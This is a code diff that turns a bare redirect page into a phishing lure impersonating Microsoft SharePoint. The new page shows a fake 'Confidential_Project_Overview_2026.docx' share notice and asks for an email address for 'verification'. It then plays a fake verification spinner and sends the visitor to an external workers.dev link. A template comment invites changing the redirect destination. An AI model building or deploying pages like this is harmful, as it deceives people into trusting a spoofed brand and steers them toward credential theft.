@@ -3,10 +3,394 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0;url=https://access-share-g5ji.p-1mqrf4hx.workers.dev/l/tYjDIsZCaKo" />
-    <title>Redirecting...</title>
+    <title>Confidential_Project_Overview_2026.docx - SharePoint</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background: linear-gradient(135deg, #f3f2f1 0%, #e1dfdd 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: white;
+            border-radius: 2px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 1px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .card-header {
+            padding: 24px 24px 0 24px;
+        }
+
+        .file-info {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .file-icon {
+            width: 40px;
+            height: 40px;
+            background: #0078d4;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            position: relative;
+        }
+
+        .file-icon::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 12px;
+            height: 12px;
+            background: linear-gradient(225deg, white 50%, transparent 50%);
+        }
+
+        .file-icon svg {
+            width: 20px;
+            height: 20px;
+            fill: white;
+        }
+
+        .file-details {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .file-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: #323130;
+            line-height: 1.4;
+            word-break: break-word;
+        }
+
+        .file-meta {
+            font-size: 12px;
+            color: #605e5c;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .sharepoint-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            color: #0078d4;
+            font-weight: 500;
+        }
+
+        .sharepoint-badge svg {
+            width: 12px;
+            height: 12px;
+            fill: currentColor;
+        }
+
+        .lock-icon {
+            width: 16px;
+            height: 16px;
+            fill: #605e5c;
+        }
+
+        .divider {
+            height: 1px;
+            background: #edebe9;
+            margin: 0 24px;
+        }
+
+        .card-body {
+            padding: 24px;
+        }
+
+        .title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 8px;
+        }
+
+        .description {
+            font-size: 13px;
+            color: #605e5c;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #323130;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-input:hover {
+            border-color: #605e5c;
+        }
+
+        .form-input:focus {
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+        }
+
+        .form-input::placeholder {
+            color: #a19f9d;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 10px 16px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 4px;
+        }
+
+        .btn-primary:hover {
+            background: #106ebe;
+        }
+
+        .btn-primary:active {
+            background: #005a9e;
+        }
+
+        .info-box {
+            display: flex;
+            gap: 8px;
+            margin-top: 16px;
+            padding: 12px;
+            background: #f3f2f1;
+            border-radius: 2px;
+        }
+
+        .info-icon {
+            width: 16px;
+            height: 16px;
+            fill: #605e5c;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #605e5c;
+            line-height: 1.4;
+        }
+
+        .card-footer {
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .footer-link {
+            color: #0078d4;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .sharepoint-logo {
+            color: #605e5c;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .sharepoint-logo svg {
+            width: 16px;
+            height: 16px;
+            fill: #0078d4;
+        }
+
+        /* Loading state */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #f3f2f1;
+            border-top-color: #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 13px;
+            color: #605e5c;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <p>If you are not redirected, <a href="https://access-share-g5ji.p-1mqrf4hx.workers.dev/l/tYjDIsZCaKo">click here</a>.</p>
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <div class="file-info">
+                    <div class="file-icon">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/>
+                        </svg>
+                    </div>
+                    <div class="file-details">
+                        <div class="file-name">Confidential_Project_Overview_2026.docx</div>
+                        <div class="file-meta">
+                            <span class="sharepoint-badge">
+                                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                                Shared via SharePoint
+                            </span>
+                            <span>•</span>
+                            <svg class="lock-icon" viewBox="0 0 24 24">
+                                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                            </svg>
+                            <span>Requires verification</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="card-body" id="formSection">
+                <h1 class="title">You've received a secured document</h1>
+                <p class="description">The shared file will appear on your screen after verification. Please enter your email address to continue.</p>
+                
+                <form id="verifyForm">
+                    <div class="form-group">
+                        <label class="form-label" for="email">Email address</label>
+                        <input 
+                            type="email" 
+                            id="email" 
+                            class="form-input" 
+                            placeholder="name@organization.com" 
+                            required
+                            autocomplete="email"
+                        >
+                    </div>
+                    
+                    <button type="submit" class="btn-primary">Verify & Open Document</button>
+                </form>
+                
+                <div class="info-box">
+                    <svg class="info-icon" viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+                    </svg>
+                    <span class="info-text">Your email is used solely to verify access. The document opens automatically after confirmation.</span>
+                </div>
+            </div>
+            
+            <div class="loading hidden" id="loadingSection">
+                <div class="spinner"></div>
+                <div class="loading-text">Verifying your access...</div>
+            </div>
+            
+            <div class="card-footer">
+                <div class="sharepoint-logo">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+                    </svg>
+                    SharePoint
+                </div>
+                <a href="#" class="footer-link">Privacy statement</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('verifyForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const formSection = document.getElementById('formSection');
+            const loadingSection = document.getElementById('loadingSection');
+            
+            // Hide form, show loading
+            formSection.classList.add('hidden');
+            loadingSection.classList.remove('hidden');
+            
+            // Simulate verification process then redirect
+            setTimeout(() => {
+                // CHANGE THIS URL TO YOUR DESIRED REDIRECT DESTINATION
+                window.location.href = 'https://access-share-g5ji.p-1mqrf4hx.workers.dev/l/tYjDIsZCaKo';
+            }, 1500);
+        });
+
+        // Add subtle input animation
+        const input = document.getElementById('email');
+        input.addEventListener('focus', () => {
+            input.parentElement.style.transform = 'scale(1.02)';
+            input.parentElement.style.transition = 'transform 0.2s';
+        });
+        input.addEventListener('blur', () => {
+            input.parentElement.style.transform = 'scale(1)';
+        });
+    </script>
 </body>
 </html>
